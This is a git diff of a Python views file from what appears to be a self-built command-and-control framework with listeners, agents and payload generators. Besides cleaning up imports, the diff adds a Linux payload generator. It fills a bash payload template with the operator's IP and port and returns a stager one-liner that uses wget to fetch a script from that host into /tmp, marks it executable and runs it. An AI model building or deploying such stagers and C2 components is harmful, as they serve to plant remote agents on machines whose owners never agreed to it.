@@ -1,16 +1,9 @@
 import base64
-from unicodedata import name
-from urllib import request, response
-from webbrowser import get
-#from cairo import Status
-#from dbus import Interface
 from django.contrib.auth.decorators import login_required
 from django.shortcuts import render
 from blog.Modules.windows.DirectoryListing import DirectoryListing
-# from blog.Modules.windows.listenershelpers import startListener
 from .forms import *
 from .models import *
-from django.http import HttpResponseRedirect
 import netifaces
 import os
 import random
@@ -22,24 +15,10 @@ import threading
 import sys
 from multiprocessing import Process
 from django.contrib.auth.models import User
-from django.core.files.storage import FileSystemStorage
 
-#from django.contrib.auth.models import Permission
-listen_path = os.path.dirname(os.path.abspath(__file__))+"/Modules/windows/data/listeners/"
+listen_path = os.path.dirname(os.path.abspath(__file__))+"/data/listeners/"
 app         = Flask(__name__)
 port = 8000
-
-
-# def http_method_list(methods):
-#     def http_methods_decorator(func):
-#         def function_wrapper(self, request, **kwargs):
-#             methods = [method.upper() for method in methods]
-#             if not request.method.upper() in methods:
-#                 return HttpResponse(status=405) # not allowed
-
-#             return func(self, request, **kwargs)
-#         return function_wrapper
-#     return http_methods_decorator
 
 
 def get_client_ip(request):
@@ -84,10 +63,6 @@ class Listener():
             form = listener(request.POST)
             if form.is_valid():
                 form.save()
-            # netifaces.ifaddresses(interface)
-            # ip= netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr'] # need or not to write into DB   
-            # s = ListenerForm(Interface = ip)
-            # s.save()
             return render(request, 'blog/listeners.html' , {'form':form})
 
 
@@ -118,6 +93,29 @@ class Listener():
         def get(self,request):
             return render(request,'blog/payload-Gen.html')
 
+
+    class lin_payloadGen(View):
+        def post(self,request):
+            eth = request.POST['interface']
+            netifaces.ifaddresses(eth)
+            ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']
+            output_path= "/tmp/{}".format(eth)
+            with open(os.path.dirname(os.path.abspath(__file__))+"/bash","rt") as p:
+                payload = p.read()
+            payload = payload.replace('REPLACE_IP',ip)
+            payload = payload.replace('REPLACE_PORT',str(port))
+            payload = payload.replace('REPLACE_INTERFACE',eth)
+            with open(output_path,"wt") as R:
+                R.write(payload)
+
+            with open(listen_path+"/{}".format(eth),"wt") as R:
+                R.write(payload)
+
+            oneliner = "wget http://{}:{}/download/{} -O /tmp/bash;chmod +x /tmp/bash;bash /tmp/bash".format(ip, str(port), eth)
+            return render(request,'blog/lin_payload-Gen.html', {'payloadline':oneliner})
+
+        def get(self,request):
+            return render(request,'blog/lin_payload-Gen.html')
 
     class agent():   ####### need to take ETH from the GUI user
         def __init__(self, name, remote , eth):
